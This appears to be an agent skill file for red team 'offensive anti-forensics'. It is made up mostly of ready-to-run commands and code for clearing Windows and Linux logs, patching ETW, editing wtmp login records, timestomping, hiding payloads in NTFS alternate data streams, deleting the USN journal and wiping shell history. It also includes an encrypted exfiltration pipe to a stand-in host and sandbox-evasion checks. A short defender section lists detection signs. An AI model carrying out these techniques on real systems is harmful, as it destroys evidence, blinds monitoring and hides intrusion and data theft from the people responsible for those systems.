---
name: offensive-anti-forensics
description: "Anti-forensics and evidence destruction techniques for red team operators conducting authorized engagements. Covers log clearing on Windows (wevtutil, Clear-EventLog, ETW provider patching) and Linux (journal truncation, utmp/wtmp binary editing, syslog manipulation), timestamp manipulation via Timestomp and SetMACE to defeat timeline analysis, filesystem-level anti-forensics including NTFS Alternate Data Streams for payload hiding and secure deletion with sdelete/shred, memory artifact removal to counter live forensics, disk artifact manipulation targeting MFT entries and USN journal records, network forensics evasion through encrypted C2 channels and DNS-over-HTTPS tunneling, and anti-VM/sandbox detection to avoid dynamic analysis environments. Tools: Timestomp, wevtutil, sdelete, shred, MimiPenguin, Invoke-Phant0m. Aligns to MITRE ATT&CK T1070 (Indicator Removal), T1027 (Obfuscated Files or Information), T1497 (Virtualization/Sandbox Evasion). Each technique includes the forensic artifact it targets, the destruction or manipulation method, and the defender perspective so operators understand detection gaps they must account for."
---

# Offensive Anti-Forensics

Anti-forensics is the practice of manipulating, destroying, or preventing the creation of forensic artifacts during an engagement. As a red team operator, you treat every action as generating evidence -- logs, timestamps, memory structures, disk metadata, and network captures all tell a story. Your objective is to control that narrative. This skill covers the primary evidence categories you encounter on Windows and Linux targets, the techniques for manipulating each, and the defender view so you understand what a competent forensic analyst looks for when your cleanup is incomplete.

You operate under an authorization scope. Every technique here assumes you have written permission to execute these actions on target systems. Document what you clear and when -- your engagement report must account for artifacts you destroyed so the blue team can rebuild their detection baseline.

## Quick Workflow

1. Enumerate logging infrastructure before executing payloads -- identify what generates evidence.
2. Disable or blind telemetry sources (ETW, Sysmon, auditd) at the earliest safe opportunity.
3. Execute your operation with minimal footprint using in-memory techniques where possible.
4. Manipulate timestamps on any files you touched to blend with surrounding filesystem activity.
5. Clear or edit logs selectively -- wholesale deletion is noisier than surgical modification.
6. Remove memory artifacts if you have reason to believe live forensics will occur.
7. Validate your cleanup by checking the same artifacts a forensic analyst would examine.

---

## Windows Event Log Clearing

Windows Event Logs are the primary evidence source on Windows targets. The Security, System, PowerShell, and Sysmon/Operational channels record authentication, process creation, and command execution events.

### Wevtutil Approach

Clear specific channels rather than all logs to reduce the blast radius of your cleanup.

```cmd
rem Clear Security log only
wevtutil cl Security

rem Clear specific channels relevant to your activity
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
wevtutil cl "Windows PowerShell"

rem Enumerate all logs to find non-obvious channels
wevtutil el | findstr /i "operational"

rem Export a log before clearing to preserve your own records
wevtutil epl Security C:\Windows\Temp\sec_backup.evtx
wevtutil cl Security
```

### PowerShell Clear-EventLog

```powershell
# Clear classic logs
Clear-EventLog -LogName Security, System, Application

# Clear modern logs via wevtutil wrapper
Get-WinEvent -ListLog * | Where-Object { $_.RecordCount -gt 0 } | ForEach-Object {
    wevtutil cl $_.LogName 2>$null
}

# Selective clearing -- remove only your time window events
# This requires parsing and rewriting, which is complex but less detectable
$targetTime = Get-Date "2026-08-24 03:00"
$events = Get-WinEvent -LogName Security | Where-Object {
    $_.TimeCreated -lt $targetTime -or $_.TimeCreated -gt $targetTime.AddHours(2)
}
# Note: native Windows APIs do not support selective event deletion
# You must clear and rewrite, or use third-party tooling
```

### ETW Provider Patching

Event Tracing for Windows underpins most logging. Patching the ETW provider in-process prevents log generation at the source, which is quieter than post-hoc clearing.

```csharp
// Patch ntdll!EtwEventWrite in the current process
// This blinds any ETW consumer for events from this process
[DllImport("kernel32.dll")]
static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);

IntPtr ntdll = GetModuleHandle("ntdll.dll");
IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
// Overwrite first byte with RET (0xC3)
uint oldProtect;
VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);
VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
```

```powershell
# Invoke-Phant0m: Kill threads responsible for Event Log Service
# This stops log writing without stopping the service itself
# The service appears running but no events are recorded
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
```

---

## Linux Log Clearing

Linux logging varies by distribution and configuration. You must account for syslog/rsyslog, systemd journal, auth logs, and login records stored in binary utmp/wtmp/btmp files.

### Syslog and Auth Log Manipulation

```bash
# Truncate rather than delete -- preserves inode and avoids alerting on missing files
truncate -s 0 /var/log/syslog
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/messages
truncate -s 0 /var/log/secure

# Selective removal -- strip lines matching your source IP
sed -i '/10\.10\.14\.5/d' /var/log/auth.log
sed -i '/10\.10\.14\.5/d' /var/log/syslog

# Remove entries within a time window from auth.log
sed -i '/Aug 24 03:0[0-9]/d' /var/log/auth.log
sed -i '/Aug 24 03:1[0-9]/d' /var/log/auth.log

# Handle rotated logs
for f in /var/log/auth.log.* /var/log/syslog.*; do
    if file "$f" | grep -q gzip; then
        gunzip "$f"
        sed -i '/10\.10\.14\.5/d' "${f%.gz}"
        gzip "${f%.gz}"
    else
        sed -i '/10\.10\.14\.5/d' "$f"
    fi
done
```

### Systemd Journal Clearing

```bash
# Flush and rotate, then vacuum
journalctl --flush --rotate
journalctl --vacuum-time=1s

# Alternative: remove journal files directly
rm -rf /var/log/journal/*
systemctl restart systemd-journald

# Selective approach: vacuum to a small size to keep recent benign entries
journalctl --vacuum-size=10M
```

### utmp/wtmp/btmp Binary Editing

These binary files record login sessions. Tools like `last` and `who` read them. You cannot edit them with sed -- you need purpose-built utilities or direct binary manipulation.

```c
/* utmp_editor.c -- remove a specific entry from utmp/wtmp
 * Compile: gcc -o utmp_editor utmp_editor.c
 * Usage: ./utmp_editor /var/log/wtmp username_to_remove */
#include <stdio.h>
#include <string.h>
#include <utmp.h>

int main(int argc, char *argv[]) {
    if (argc != 3) return 1;
    FILE *fp = fopen(argv[1], "r+b");
    FILE *tmp = fopen("/tmp/.utmp_clean", "wb");
    struct utmp entry;
    while (fread(&entry, sizeof(entry), 1, fp) == 1) {
        if (strncmp(entry.ut_user, argv[2], UT_NAMESIZE) != 0) {
            fwrite(&entry, sizeof(entry), 1, tmp);
        }
    }
    fclose(fp); fclose(tmp);
    rename("/tmp/.utmp_clean", argv[1]);
    return 0;
}
```

```bash
# Quick approach using utmpdump (available on most distros)
utmpdump /var/log/wtmp > /tmp/wtmp.txt
grep -v "your_username" /tmp/wtmp.txt > /tmp/wtmp_clean.txt
utmpdump -r < /tmp/wtmp_clean.txt > /var/log/wtmp
rm /tmp/wtmp.txt /tmp/wtmp_clean.txt
```

---

## Timestamp Manipulation

Forensic timeline analysis correlates file modification, access, creation, and entry-modified times (MACE) across the filesystem. Manipulating these timestamps defeats or complicates timeline reconstruction.

### Windows Timestomp

```powershell
# Native PowerShell timestamp modification
$file = Get-Item C:\Windows\Temp\payload.exe
$file.CreationTime = "01/15/2025 08:30:00"
$file.LastWriteTime = "01/15/2025 08:30:00"
$file.LastAccessTime = "01/15/2025 08:30:00"

# Match timestamps to a legitimate system file
$ref = Get-Item C:\Windows\System32\notepad.exe
$target = Get-Item C:\Windows\Temp\payload.exe
$target.CreationTime = $ref.CreationTime
$target.LastWriteTime = $ref.LastWriteTime
$target.LastAccessTime = $ref.LastAccessTime
```

```powershell
# Metasploit Timestomp via Meterpreter
# meterpreter> timestomp C:\\Windows\\Temp\\payload.exe -f C:\\Windows\\System32\\notepad.exe
# This copies all MACE values from notepad.exe to your payload

# SetMACE via direct NTFS manipulation (bypasses standard API logging)
# Requires raw NTFS access -- tools like SetMACE modify $STANDARD_INFORMATION
# and $FILE_NAME attributes in the MFT directly
```

### Linux Timestamp Manipulation

```bash
# Set specific timestamps using touch
touch -t 202501150830.00 /tmp/payload
touch -a -t 202501150830.00 /tmp/payload  # access time only
touch -m -t 202501150830.00 /tmp/payload  # modification time only

# Clone timestamps from a reference file
touch -r /usr/bin/ssh /tmp/payload

# Modify ctime (change time) -- requires debugfs on ext4
# ctime cannot be set via standard APIs, which forensic analysts know
debugfs -w /dev/sda1 -R "set_inode_field /tmp/payload ctime 202501150830"

# Recursive timestamp normalization for a directory of tools
find /opt/tools -type f -exec touch -r /usr/bin/ls {} \;
```

---

## Filesystem Anti-Forensics

### NTFS Alternate Data Streams

NTFS ADS allows you to attach data to a file without changing its visible size or content. Standard directory listings do not show ADS content.

```cmd
rem Hide payload in an ADS attached to a benign file
type payload.exe > C:\Users\Public\Documents\readme.txt:payload.exe

rem Execute from ADS (varies by Windows version and payload type)
wmic process call create "C:\Users\Public\Documents\readme.txt:payload.exe"

rem List ADS on a file
dir /r C:\Users\Public\Documents\readme.txt

rem PowerShell ADS operations
Set-Content -Path "C:\Users\Public\readme.txt" -Stream "hidden" -Value "config data"
Get-Content -Path "C:\Users\Public\readme.txt" -Stream "hidden"
Get-Item -Path "C:\Users\Public\readme.txt" -Stream *
```

### Secure Deletion

```cmd
rem Windows: SDelete from Sysinternals
sdelete -p 3 C:\Windows\Temp\payload.exe
sdelete -p 3 -s C:\Windows\Temp\tools\

rem Cipher /w overwrites deallocated space on a volume
cipher /w:C:\Windows\Temp
```

```bash
# Linux: shred overwrites file content before unlinking
shred -vfz -n 3 /tmp/payload

# Secure delete then remove
shred -u /tmp/payload

# Overwrite free space on a partition
dd if=/dev/urandom of=/tmp/wipe_free bs=1M 2>/dev/null; rm /tmp/wipe_free
sync

# For SSDs, TRIM complicates recovery but does not guarantee destruction
fstrim -v /
```

---

## Disk Artifact Manipulation

### MFT and USN Journal

The NTFS Master File Table records metadata for every file, including deleted ones. The USN (Update Sequence Number) Journal logs every change to files on a volume. Both are high-value forensic sources.

```cmd
rem Delete the USN Journal (requires admin)
fsutil usn deletejournal /d C:

rem Query USN journal to understand what it recorded about your activity
fsutil usn readjournal C: csv > usn_dump.csv
findstr /i "payload" usn_dump.csv

rem Disable USN journal creation on a volume
fsutil usn deletejournal /n C:
```

```powershell
# MFT entries for deleted files persist until overwritten
# Filling the volume forces MFT entry reuse
$stream = [System.IO.File]::Create("C:\Windows\Temp\filler.bin")
$buffer = New-Object byte[] (1024 * 1024)
try { while ($true) { $stream.Write($buffer, 0, $buffer.Length) } }
catch { $stream.Close(); Remove-Item "C:\Windows\Temp\filler.bin" }
```

---

## Memory Artifact Removal

Live forensics and memory captures can recover credentials, command history, loaded modules, and network connections from process memory.

```powershell
# Clear PowerShell command history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# Remove credential artifacts from LSASS (risky -- may crash the process)
# Preferred: avoid dumping creds to disk in the first place -- use in-memory-only tools
```

```bash
# Clear bash history for current session
unset HISTFILE
export HISTSIZE=0
history -c
rm -f ~/.bash_history

# Prevent history writing for the session
set +o history

# Clear in-memory credentials (if using SSH agent)
ssh-add -D

# Overwrite /proc/self artifacts is not directly possible
# Instead, exec into a new process to shed memory artifacts
exec bash --norc --noprofile
```

---

## Network Forensics Evasion

Network captures, flow data, and DNS logs can reveal C2 communication, lateral movement, and data exfiltration. You evade these by encrypting traffic, blending with legitimate protocols, and using trusted infrastructure.

```yaml
# DNS-over-HTTPS for C2 resolution -- avoids DNS logging at the network layer
# Example: configure a tool to resolve C2 domains via DoH
doh_resolvers:
  - https://cloudflare-dns.com/dns-query
  - https://dns.google/dns-query

# Encapsulate C2 in HTTPS to blend with legitimate web traffic
# Use domain fronting or legitimate CDN endpoints
# See offensive-c2-frameworks skill for detailed C2 traffic shaping
```

```bash
# SSH tunneling to encrypt lateral movement traffic
ssh -D 9050 -f -N pivot@10.10.10.5
proxychains nmap -sT 172.16.0.0/24

# Encrypt exfiltrated data before transfer
tar czf - /sensitive/data | openssl enc -aes-256-cbc -pbkdf2 -pass pass:ExfilKey | \
    curl -X POST -H "Content-Type: application/octet-stream" --data-binary @- https://exfil.example.com/upload
```

---

## Anti-VM and Sandbox Detection

Malware sandboxes and forensic analysis VMs have detectable characteristics. During red team engagements, you may need your payloads to behave differently -- or not at all -- in analysis environments.

```csharp
// Common VM detection checks
using System.Management;

public static bool IsVirtualMachine() {
    using (var searcher = new ManagementObjectSearcher(
        "SELECT * FROM Win32_ComputerSystem")) {
        foreach (var item in searcher.Get()) {
            string manufacturer = item["Manufacturer"]?.ToString().ToLower() ?? "";
            string model = item["Model"]?.ToString().ToLower() ?? "";
            if (manufacturer.Contains("vmware") || manufacturer.Contains("virtual") ||
                model.Contains("virtual") || manufacturer.Contains("xen"))
                return true;
        }
    }
    // Check for VM-specific processes
    string[] vmProcesses = { "vmtoolsd", "vmwaretray", "vboxservice", "vboxtray" };
    foreach (var proc in Process.GetProcesses()) {
        if (Array.Exists(vmProcesses, p => proc.ProcessName.ToLower().Contains(p)))
            return true;
    }
    return false;
}
```

```powershell
# Quick sandbox evasion checks
$checks = @{
    LowMemory    = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB
    FewCores     = (Get-CimInstance Win32_Processor).NumberOfCores -lt 2
    SmallDisk    = (Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum -lt 60GB
    RecentBoot   = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime -gt (Get-Date).AddMinutes(-5)
    NoUserFiles  = (Get-ChildItem "$env:USERPROFILE\Documents" -ErrorAction SilentlyContinue).Count -lt 3
}
if ($checks.Values -contains $true) {
    Write-Host "Potential sandbox detected"
    exit
}
```

---

## Detection / Defender View

Forensic analysts and SOC teams look for the following indicators of anti-forensic activity:

- **Event Log gaps**: Event ID 1102 (Security log cleared) and Event ID 104 (System log cleared) are themselves logged. Clearing logs creates an evidence trail of the clearing.
- **Timestamp inconsistencies**: $STANDARD_INFORMATION and $FILE_NAME timestamps in the MFT that do not match indicate timestomping. The $FILE_NAME attribute is harder to modify and often retains original values.
- **USN Journal deletion**: The absence of a USN journal or a journal with a very recent creation date signals deliberate destruction.
- **Log file size anomalies**: A log file with a recent modification time but zero or minimal size indicates truncation.
- **Shell history gaps**: Missing .bash_history or a history file with a recent modification time and no content.
- **Sysmon EventID 2** records file creation time changes, directly detecting timestomp operations.
- **ETW patch detection**: Scanning ntdll for inline hooks or RET instructions at EtwEventWrite.
- **ADS discovery**: Tools like Streams.exe (Sysinternals) or PowerShell Get-Item -Stream enumerate alternate data streams.
- **Prefetch and Shimcache**: These Windows artifacts persist even after executable deletion and are often overlooked during cleanup.

---

## Engagement Cheatsheet

| Artifact Category     | Windows Technique                     | Linux Technique                      | MITRE ID |
|-----------------------|---------------------------------------|--------------------------------------|----------|
| Event/Syslog clearing | wevtutil cl / Clear-EventLog         | truncate -s 0 / sed -i              | T1070.001 |
| Login records          | N/A (Security log)                   | utmpdump edit / wtmp binary edit     | T1070.002 |
| Command history        | Remove PSReadline history            | unset HISTFILE / history -c          | T1070.003 |
| File deletion          | sdelete / cipher /w                  | shred -u / dd overwrite              | T1070.004 |
| Timestomping           | PowerShell Set / Timestomp / SetMACE | touch -r / debugfs ctime             | T1070.006 |
| ETW blinding           | Patch EtwEventWrite / Invoke-Phant0m | N/A                                  | T1562.001 |
| NTFS ADS hiding        | type > file:stream                   | N/A (ext4 xattr for similar)         | T1564.004 |
| Disk artifacts         | fsutil usn deletejournal             | debugfs / fstrim                     | T1070.008 |
| Network evasion        | HTTPS C2 / DoH                       | SSH tunnels / encrypted exfil        | T1573     |
| VM/Sandbox detection   | WMI queries / process checks         | dmidecode / lshw checks              | T1497.001 |

---

## Key References

- MITRE ATT&CK T1070 - Indicator Removal: https://attack.mitre.org/techniques/T1070/
- MITRE ATT&CK T1027 - Obfuscated Files or Information: https://attack.mitre.org/techniques/T1027/
- MITRE ATT&CK T1497 - Virtualization/Sandbox Evasion: https://attack.mitre.org/techniques/T1497/
- SANS Digital Forensics and Incident Response: https://www.sans.org/digital-forensics-incident-response/
- Anti-Forensics Techniques (SANS Whitepaper): https://www.sans.org/white-papers/
- Invoke-Phant0m: https://github.com/hlldz/Invoke-Phant0m
- Timestomp (Metasploit): https://docs.metasploit.com/
- SDelete (Sysinternals): https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete
- NTFS Alternate Data Streams: https://docs.microsoft.com/en-us/archive/blogs/askcore/alternate-data-streams-in-ntfs
